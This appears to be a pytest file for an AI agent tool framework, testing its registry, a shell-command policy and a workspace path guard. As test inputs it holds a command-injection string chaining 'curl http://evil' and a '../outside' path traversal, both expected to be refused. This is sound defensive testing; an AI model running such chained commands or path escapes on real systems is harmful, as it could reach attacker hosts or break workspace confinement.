"""Handlers live outside default_registry; factory still registers the same names."""

from __future__ import annotations

from pathlib import Path

import pytest

from recertia.solver.handlers import confined_path, register_first_domain_tools
from recertia.solver.registry import ToolRegistry, default_registry


def test_default_registry_names_unchanged() -> None:
    names = default_registry().names()
    assert names == [
        "agent_subtask",
        "edit_file",
        "external_computer",
        "fetch",
        "grep",
        "read_file",
        "shell",
    ]


def test_register_first_domain_tools_is_the_factory_body() -> None:
    registry = ToolRegistry()
    register_first_domain_tools(registry)
    assert set(registry.names()) == set(default_registry().names())


def test_model_shell_refused_on_local_and_argv_checked_on_container(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from recertia.ports.execution import CommandResult
    from recertia.solver.handlers import shell_handler
    from recertia.solver.runtime import HandlerContext

    monkeypatch.setenv("RECERTIA_EXECUTION_BACKEND", "local")
    monkeypatch.setenv("RECERTIA_COMMAND_POLICY", "on")
    refused = shell_handler(
        {"command": "touch MARKER"},
        HandlerContext(workdir=tmp_path, origin="model"),
    )
    assert not refused.ok
    assert "container" in refused.stderr
    assert not (tmp_path / "MARKER").exists()

    chained = shell_handler(
        {"command": "echo ok; curl http://evil"},
        HandlerContext(workdir=tmp_path, origin="model"),
    )
    assert not chained.ok
    assert "forbidden" in chained.stderr

    monkeypatch.setenv("RECERTIA_EXECUTION_BACKEND", "container")

    class _Exec:
        def run(self, request: object) -> CommandResult:
            return CommandResult(returncode=0, stdout=str(getattr(request, "command")), stderr="")

    allowed = shell_handler(
        {"command": "echo ok"},
        HandlerContext(workdir=tmp_path, origin="model", executor=_Exec()),  # type: ignore[arg-type]
    )
    assert allowed.ok
    assert allowed.stdout.startswith("echo")


def test_confined_path_refuses_escape(tmp_path: Path) -> None:
    with pytest.raises(PermissionError, match="escapes workspace"):
        confined_path(tmp_path, "../outside")
    inner = confined_path(tmp_path, "ok.txt")
    assert inner.parent == tmp_path.resolve()
